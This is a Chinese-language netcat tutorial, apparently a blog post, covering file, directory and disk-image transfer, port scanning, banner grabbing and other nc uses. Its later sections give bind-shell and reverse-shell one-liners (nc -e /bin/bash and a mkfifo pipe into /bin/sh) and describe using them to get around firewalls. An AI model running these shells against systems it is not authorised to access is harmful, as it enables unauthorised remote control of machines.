---
title: 使用nc传输超大文件
top: 
date: {{date}}
tags: 
- Linux
- nc
- Windows
categories: 
- Linux
password: 
---
### 说明
    linux下的文件传输，大家首先会想到rsync、scp之类的工具，但这类工具有一个特点——慢，
    因为这类工具都是加密传输，发送端加密，接收端解密，当我们传输一些非敏感文件的时候，完全可以不加密，直接在网络上传输。


​    

### 安装
    1. linux系统安装
    # yum install -y nc | nmap-ncat
    ps.ubuntu自带的nc是netcat-openbsd版,不带-c/-e参数。
    
    2. windows系统安装
    (1)下载
    下载netcat。下载地址：https://eternallybored.org/misc/netcat/, 
![](/nc/1.png)
    
    (2)解压文件夹
    (3)将文件夹所在路径添加到用户环境变量里
    (4)打开命令界面：Windows+R  cmd。输入nc 命令即可

<escape><!-- more --></escape>

### 参数
    想要连接到某处: nc [-options] hostname port[s] [ports] …
    绑定端口等待连接: nc -l port [-options] [hostname] [port]
    
    -g<网关>：设置路由器跃程通信网关，最多设置8个;
    -G<指向器数目>：设置来源路由指向器，其数值为4的倍数;
    -h：在线帮助;
    -i<延迟秒数>：设置时间间隔，以便传送信息及扫描通信端口;
    -l：使用监听模式，监控传入的资料;
    -n：直接使用ip地址，而不通过域名服务器;
    -o<输出文件>：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存;
    -p<通信端口>：设置本地主机使用的通信端口;
    -r：指定源端口和目的端口都进行随机的选择;
    -s<来源位址>：设置本地主机送出数据包的IP地址;
    -u：使用UDP传输协议;
    -v：显示指令执行过程;
    -w<超时秒数>：设置等待连线的时间;
    -z：使用0输入/输出模式，只在扫描通信端口时使用。

### 用法
#### 连接远程主机
    Client连接到Server的TCP 80端口: $nc -nvv 192.168.x.x 8000
    Server监听本机的TCP8000端口: $nc -l 8000
    
    超时控制:
    多数情况我们不希望连接一直保持，那么我们可以使用 -w 参数来指定连接的空闲超时时间，该参数紧接一个数值，代表秒数，如果连接超过指定时间则连接会被终止。
    Server: $nc -l 2389
    Client: $nc -w 10 localhost 2389
    该连接将在 10 秒后中断。注意: 不要在服务器端同时使用 -w 和 -l 参数，因为 -w 参数将在服务器端无效果。

#### 端口扫描
    端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。
    $nc -z -v -n 192.168.1.1 21-25
    可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.
    z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换.
    v 参数指详细输出.
    n 参数告诉netcat 不要使用DNS反向查询IP地址的域名.
    以上命令会打印21到25 所有开放的端口。
    
    $nc -v 127.0.0.1 22
    localhost [127.0.0.1] 22 (ssh) open
    SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
    "SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4"为Banner信息。
    Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。
    但是，并不是所有的服务都会发送banner.一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。

#### Chat Server
    内网聊天,netcat提供了这样一种方法，只需要创建一个Chat服务器，一个预先确定好的端口，这样子就可以在内网聊天沟通了.
    Server: $nc -l 20000
    netcat 命令在20000端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。
    
    Client:$nc 192.168.1.1 20000
    不管你在机器Client上键入什么都会出现在机器Server上。

#### 文件传输
    linux下的文件传输，大家首先会想到rsync、scp之类的工具，但这类工具有一个特点——慢，因为这类工具都是加密传输，发送端加密，接收端解密，当我们传输一些非敏感文件的时候，完全可以不加密，直接在网络上传输。
    Server: $ time nc -l 20000 < file.txt
    命令最前面的time是用来检测该命令运行耗时的。
    Client: $nc -n 192.168.1.1 20000 > file.txt
    我们创建了一个服务器在A上并且重定向netcat的输入为文件file.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。
    在客户端我们重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt.没有必要创建文件源作为Server，我们也可以相反的方法使用。
    
    像下面的我们发送文件从B到A，但是服务器创建在A上，这次我们仅需要重定向netcat的输出并且重定向B的输入文件。
    
    B作为Server
    Server: $nc -l 20000 > file.txt   
    Client: $nc 192.168.1.2 20000 < file.txt
    
    用nc传输有两个特点：
    ➤速度快
    ➤传输简单，不需要登录对方服务器，不需要验证信息。
    
    nc进度显示
    若你文件实在太大，想看到传输进度，用PV
    
    yum install epel-release -y
    yum install pv -y
    cat file.txt |pv -b | nc  192.168.1.1 20000

#### 中转文件
    A、B、C三台主机，A美国，C日本，C只能访问到B，不能直接访问A，B和AC互通。C要怎么才能拿到A上的文件呢？
    C上执行：nc -l 9999 > google_file.txt
    B上执行：nc -l 9999 | nc (C的外网IP) 9999
    A上执行：nc (B的外网IP) 9999 < google_file.txt

#### 目录传输
    想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。
    如果你想要通过网络传输一个目录从A到B。
    Server: $tar -cvf – dir_name | nc -l 20000
    Client: $nc -n 192.168.1.1 20000 | tar -xvf -
    在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。
    在客户端我们下载该压缩包通过netcat 管道然后打开文件。
    
    如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。
    Server: $tar -cvf – dir_name| bzip2 -z | nc -l 20000
    通过bzip2压缩
    Client: $nc -n 192.168.1.1 20000 | bzip2 -d |tar -xvf -
    
    还可以把目录制作成iso文件进行传输
    $ yum install mkisofs
    mkisofs -r -o 路径/ISO 文件名 目录文件路径
    例子：mkisofs -r -o /opt/mycd.iso /home






#### 加密通过网络发送的数据
    如果担心你在网络上发送数据的安全，可以在发送你的数据之前用如mcrypt的工具加密。
    
    使用mcrypt工具加密数据。
    Server: $nc localhost 20000 | mcrypt –flush –bare -F -q -d -m ecb > file.txt
    使用mcrypt工具解密数据。
    Client: $mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 20000
    
    以上两个命令会提示需要密码，确保两端使用相同的密码。
    这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。

#### 流视频
    虽然不是生成流视频的最好方法，但如果服务器上没有特定的工具，使用netcat，我们仍然有希望做成这件事。
    这里我们只是从一个视频文件中读入并重定向输出到netcat客户端
    Server: $cat video.avi | nc -l 20000
    
    这里我们从socket中读入数据并重定向到mplayer。
    Client: $nc 192.168.1.1 20000 | mplayer -vo x11 -cache 3000 -

#### 克隆一个设备
    如果你已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。
    不在需要重复配置安装的过程，只启动另一台机器的一些引导可以随身碟和克隆你的机器。
    克隆Linux PC很简单，假如你的系统在磁盘/dev/sda上
    Server: $dd if=/dev/sda | nc -l 20000
    
    Client: $nc -n 192.168.1.1 20000 | dd of=/dev/sda
    
    dd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。
    但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。

#### 打开一个shell
    假设你的netcat支持 -c -e 参数(原生 netcat)
    Server: $nc -l 20000 -e /bin/bash -i
    Client: $nc 192.168.1.1 20000
    
    这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash
    假如netcat 不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell
    
    Server: 
    $mkfifo /tmp/tmp_fifo
    $cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 20000 > /tmp/tmp_fifo
    这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2>&1中。
    2>&1是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口20000上。至此，我们已经把netcat的输出重定向到fifo文件中。
    说明：
    从网络收到的输入写到fifo文件中
    cat 命令读取fifo文件并且其内容发送给sh命令
    sh命令进程受到输入并把它写回到netcat。
    netcat 通过网络发送输出到client
    至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。
    在客户端仅仅简单连接到服务器
    
    Client: $nc -n 192.168.1.1 20000
    你会得到一个shell提示符在客户端

#### 反向shell
    反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。
    Server: $nc -l 20000
    
    在客户端，简单地告诉netcat在连接完成后，执行shell。
    Client: $nc 192.168.1.1 20000 -e /bin/bash
    
    现在，什么是反向shell的特别之处呢
    反向shell经常被用来绕过防火墙的限制，如阻止入站连接。
    例如，我有一个专用IP地址为192.168.1.1，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如1.2.3.4的shell，那么我会用反向外壳用于这一目的。

####　指定源端口
    假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。
    Server：$nc -l 20000
    Client：$nc 192.168.1.1 20000 25
    
    使用1024以内的端口需要root权限。
    该命令将在客户端开启25端口用于通讯，否则将使用随机端口。

#### 指定源地址
    假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。我们可以在netcat中使用-s选项指定ip地址。
    Server: $nc -u -l 20000 < file.txt
    Client: $nc -u 192.168.1.1 20000 -s 172.31.100.5 > file.txt
    该命令将绑定地址172.31.100.5。

#### 静态web页面服务器

    新建一个网页,命名为somepage.html;
    新建一个shell script:
    while true; do
        nc -l 80 -q 1 < somepage.html;
    done
    
    用root权限执行，然后在浏览器中输入127.0.0.1打开看看是否正确运行。
    nc 指令通常都是给管理者进行除错或测试等作用的，所以如果只是单纯需要临时的网页服务器，使用 Python 的 SimpleHTTPServer 组会比较方便。

#### 模拟HTTP Headers
    $nc www.huanxiangwu.com 80
    GET / HTTP/1.1
    Host: ispconfig.org
    Referrer: mypage.com
    User-Agent: my-browser
    
    HTTP/1.1 200 OK
    Date: Tue, 16 Dec 2008 07:23:24 GMT
    Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8
    Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/
    Expires: 0
    Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
    Pragma: no-cache
    Cache-Control: private, post-check=0, pre-check=0, max-age=0
    Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/
    Vary: Accept-Encoding
    Transfer-Encoding: chunked
    Content-Type: text/html
    [......]
    
    在nc命令后，输入红色部分的内容(命令下方的4行内容)，然后按两次回车，即可从对方获得HTTP Headers内容。

#### Netcat支持IPv6
    netcat 的 -4 和 -6 参数用来指定 IP 地址类型，分别是 IPv4 和 IPv6：
    Server: $ nc -4 -l 2389
    Client: $ nc -4 localhost 2389
    
    然后我们可以使用 netstat 命令来查看网络的情况：
    $ netstat | grep 2389
    tcp        0      0 localhost:2389          localhost:50851         ESTABLISHED
    tcp        0      0 localhost:50851         localhost:2389          ESTABLISHED
    
    接下来我们看看IPv6 的情况：
    Server: $ nc -6 -l 2389
    Client: $ nc -6 localhost 2389
    
    再次运行 netstat 命令：
    $ netstat | grep 2389
    tcp6       0      0 localhost:2389          localhost:33234         ESTABLISHED
    tcp6       0      0 localhost:33234         localhost:2389          ESTABLISHED
    前缀是 tcp6 表示使用的是 IPv6 的地址。

#### 在 Netcat 中禁止从标准输入中读取数据
    该功能使用 -d 参数，请看下面例子：
    Server: $ nc -l 2389
    
    Client: $ nc -d localhost 2389
    Hi
    你输入的 Hi 文本并不会送到服务器端

#### 强制 Netcat 服务器端保持启动状态
    如果连接到服务器的客户端断开连接，那么服务器端也会跟着退出。
    Server: $ nc -l 2389
    Client: $ nc localhost 2389
    ^C
    
    Server: $ nc -l 2389
    上述例子中，但客户端断开时服务器端也立即退出。
    
    我们可以通过 -k 参数来控制让服务器不会因为客户端的断开连接而退出。
    Server: $ nc -k -l 2389
    Client: $ nc localhost 2389
    ^C
    
    Server: $ nc -k -l 2389

#### 配置 Netcat 客户端不会因为 EOF 而退出
    Netcat 客户端可以通过 -q 参数来控制接收到 EOF 后隔多长时间才退出，该参数的单位是秒：
    Client: $nc  -q 5  localhost 2389
    现在如果客户端接收到 EOF ，它将等待 5 秒后退出。

#### 手动使用 SMTP 协议寄信

    在测试邮件服务器是否正常时，可以使用这样的方式手动发送 Email：
    
    $nc localhost 25 << EOF
    HELO host.example.com
    MAIL FROM: <user@host.example.com>
    RCPT TO: <user2@host.example.com>
    DATA
    Body of email.
    .
    QUIT
    EOF

#### 透过代理服务器（Proxy）连线
    这指令会使用 10.2.3.4:8080 这个代理服务器，连线至 host.example.com 的42端口。
    $nc -x10.2.3.4:8080 -Xconnect host.example.com 42

#### 使用 Unix Domain Socket
    这行指令会建立一个 Unix Domain Socket，并接收资料：
    $nc -lU /var/tmp/dsocket